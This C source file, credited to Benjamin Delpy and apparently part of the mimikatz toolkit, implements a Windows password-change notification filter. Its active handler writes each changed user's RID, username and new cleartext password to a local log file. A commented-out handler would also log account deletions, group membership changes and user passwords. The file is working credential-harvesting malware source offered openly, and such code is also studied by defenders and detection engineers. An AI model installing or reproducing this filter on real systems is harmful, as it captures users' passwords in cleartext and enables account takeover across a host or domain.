/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kfilt.h"

BOOLEAN NTAPI kfilt_InitializeChangeNotify(void)
{
	return TRUE;
}

NTSTATUS NTAPI kfilt_PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword)
{
	FILE * kfilt_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kfilt_logfile = _wfopen(L"kiwifilter.log", L"a"))
#pragma warning(pop)
	{
		klog(kfilt_logfile, L"[%08x] %wZ\t", RelativeId, UserName);
		klog_password(kfilt_logfile, NewPassword);
		klog(kfilt_logfile, L"\n");
		fclose(kfilt_logfile);
	}
	return STATUS_SUCCESS;
}

//// in .def: DeltaNotify				=	kfilt_DeltaNotify
//PCWCHAR kfilt_DeltaNotify_Operation[] = {L"CreateInDomain", L"SetInformation_a", L"Delete", L"AddMember", L"unknown5", L"RemoveMember", L"SetInformation_b", L"Password"},
//		kfilt_DeltaNotify_Category[] = {L"Domain", L"User", L"Group", L"Alias"};
//NTSTATUS NTAPI kfilt_DeltaNotify(PSID pSid, DELTA_OPERATION_TYPE operation, DELTA_CATEGORY_TYPE category, ULONG RelativeId, PDELTA_OPERATION_DATA data5, PDWORD a6, PDELTA_OPERATION_DATA data7)
//{
//	FILE * kfilt_logfile;
//#pragma warning(push)
//#pragma warning(disable:4996)
//	if(kfilt_logfile = _wfopen(L"kiwifilter2.log", L"a"))
//#pragma warning(pop)
//	{
//		klog(kfilt_logfile, L"%s->%s @ ", (category >= DeltaCategoryDomain && category <= DeltaCategoryAlias) ? kfilt_DeltaNotify_Category[category - 1] : L"?", (operation >= DeltaOperationCreateInDomain && operation <= DeltaOperationPassword) ? kfilt_DeltaNotify_Operation[operation - 1] : L"?");
//		klog_sid(kfilt_logfile, pSid);
//		klog(kfilt_logfile, L"-%u (0x%x, ct @ %p = %u)\n", RelativeId, RelativeId, a6, *a6);
//
//		klog(kfilt_logfile, L"\t{ data5 @ %p - data7 @ %p }\n", data5, data7);
//		// DeltaOperationCreateInDomain
//		if(data5)
//		{
//			switch(operation)
//			{
//			case DeltaOperationDelete:
//				klog(kfilt_logfile, L"\tName: %wZ\n", &data5->opDelete.Name);
//				break;
//			default:
//				;
//			}
//		}
//		
//		if(data7)
//		{
//			switch(operation)
//			{
//			case DeltaOperationAddMemberTo:
//			case DeltaOperationRemoveMemberFrom:
//				klog(kfilt_logfile, L"\t@ ");
//				klog_sid(kfilt_logfile, data7->opMember.pSid);
//				klog(kfilt_logfile, L"\n");
//				break;
//			case DeltaOperationPassword:
//				if(category == DeltaCategoryUser)
//				{
//					klog(kfilt_logfile, L"\tUserName: %wZ\n\tPassword: ", &data7->opPassword.UserName);
//					klog_password(kfilt_logfile, &data7->opPassword.Password);
//					klog(kfilt_logfile, L"\n");
//				}
//				break;
//			case DeltaOperationSetInformation_b:
//			default:
//				;
//			}
//		}
//		//klog(kfilt_logfile, L"\t{ data5 @ %p - a6 @ %p - data7 @ %p }\n", data5, a6, data7);
//		fclose(kfilt_logfile);
//	}
//	return STATUS_SUCCESS;
//}